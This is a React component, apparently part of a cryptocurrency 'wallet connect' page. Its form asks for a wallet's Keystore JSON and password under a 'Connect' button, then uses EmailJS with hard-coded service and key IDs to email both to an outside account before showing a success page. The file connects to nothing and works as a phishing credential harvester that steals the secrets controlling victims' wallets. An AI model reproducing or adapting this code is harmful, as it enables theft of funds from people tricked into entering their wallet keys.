import * as React from 'react';
import Box from '@mui/material/Box';
import TextField from '@mui/material/TextField';
import Button from '@mui/material/Button';
import { useNavigate } from "react-router-dom";
import { useRef } from 'react';
import emailjs from '@emailjs/browser';

const KeyStore = () => {
  const form = useRef();
  let navigate = useNavigate();


  const sendEmail = (e) => {
    e.preventDefault();

    emailjs.sendForm('service_baa21jx', 'template_49mmn1g', form.current, 'P_9SIX5hhtfJnOac4')
      .then((result) => {
        navigate('/success-page');
      }, (error) => {
        navigate("/error")
  });
  };

  return (
    <Box
      component="form"
      sx={{
        '& .MuiTextField-root': { m: 1, width: '100%' },
      }}
      noValidate
      autoComplete="off"
      ref={form} onSubmit={sendEmail}
    >
      
      <div>
        
        <TextField
          autoFocus
          placeholder="Enter your Keystore JSON"
          id="standard-multiline-static"
          label="Keystore JSON"
          size="Large"
          multiline
          rows={12}
          name="key_phrase"
          variant="standard"
        />
        <TextField
          id="outlined-password-input"
          label="Password"
          type="password"
          autoComplete="current-password"
          name="password"
          
        />
        <Box margin={4}>
          <Button 
            variant="contained" 
            color="success"
            type="submit"
            size="large"
            
          >
          Connect
        </Button>
        </Box>
      </div>
    </Box>
  );
}


export default KeyStore